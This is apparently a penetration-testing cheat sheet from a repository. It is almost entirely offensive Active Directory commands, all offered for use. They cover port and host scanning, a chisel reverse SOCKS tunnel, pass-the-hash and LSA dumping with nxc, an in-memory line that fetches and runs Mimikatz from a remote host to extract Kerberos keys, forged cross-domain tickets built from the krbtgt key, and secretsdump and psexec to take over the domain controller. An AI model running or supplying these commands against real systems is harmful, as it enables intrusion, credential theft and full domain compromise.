# red-team-tactics
Red team and penetration testing notes focused on attack decisions and the reasoning behind tactical choices.

### Fast port enumeration
```bash
TARGET=192.168.98.2; (echo 5985; grep -v '^#' /usr/share/nmap/nmap-services | sort -rk3 | head -n 1000 | awk '{print $2}' | cut -d/ -f1) | awk '!seen[$0]++' | xargs -P8 -I{} bash -c 'for i in 1 2 3; do nc -vz -w4 '"$TARGET"' {} 2>&1 | grep -m1 "succeeded!" && exit 0; done'
```
⚡ Add proxychains before nc if using a proxy tunnel  
⚡ Port 5985 is manually included because it’s not in nmap’s top 1000 ports  
▶️ [Video explanation](https://www.youtube.com/watch?v=Jv-MDAuRcHs&t=37s)

### Scan internal network
```bash
#!/bin/bash
for last in $(seq 1 254)
do
	timeout 1 bash -c "ping -c 1 <IP>.$last" &> /dev/null && echo [+] IP active <IP>.$last &
done
```

### Setup proxy tunneling
```bash
scp -P 22 chisel_linux privilege@192.168.80.10:~/

Remote:
./chisel_linux client 10.10.200.34:8001 R:socks
Local:
./chisel_linux server --port 8001 --reverse --socks5
```

### ldapsearch
```bash
sudo proxychains ldapsearch -x -b "dc=something,dc=corp" "*" -H

### find all
```bash
find / -iname "*admin*" 2>/dev/null
```

### nxc
```bash
nxc smb <IP> -u guest -p ''
nxc smb <IP> -u '<USER>' -H <HASH>
nxc smb <IP> -d something.corp -u <USER> -H <HASH> --lsa
```
### bloodhound-python
```bash
bloodhound-python -u '<USER>' -p '<PASSWORD>' -d something.corp -c all --zip -ns <IP> --dns-tcp
```
### host/etc
```bash
echo "IP HOSTNAME" | sudo tee -a /etc/hosts
```

### In-Memory Powershell Loading
```bash
iex (iwr http://IP:PORT/Invoke-Mimi.ps1 -UseBasicParsing); Invoke-Mimi -Command "privilege::debug sekurlsa::ekeys exit"
```

### Trust attack prep
```bash
ticketer.py -domain child.something.corp -aesKey <KRBTGT> -domain-sid <SID> -groups 516 -user-id <UID> -extra-sid <SID>,S-1-5-9 'USER'

export KRB5CCNAME=<SAVED_TICKET>

klist

proxychains getST.py -spn 'CIFS/dc.something.corp' -k -no-pass child.something.corp/USER -debug

export KRB5CCNAME=<SAVED_TICKET>

secretsdump.py -k -no-pass dc.something.corp -just-dc-user "DOMAIN/administrator" -debug

psexec.py 'DOMAIN/administrator@dc.something.corp' -hashes <HASH>
```

### Impacket
```bash
secretsdump.py -hashes ':<HASH>' 'something.corp/<USER>@<IP>'
lookupsid.py something.corp/<USER>@something.corp -hashes :<HASH>
```

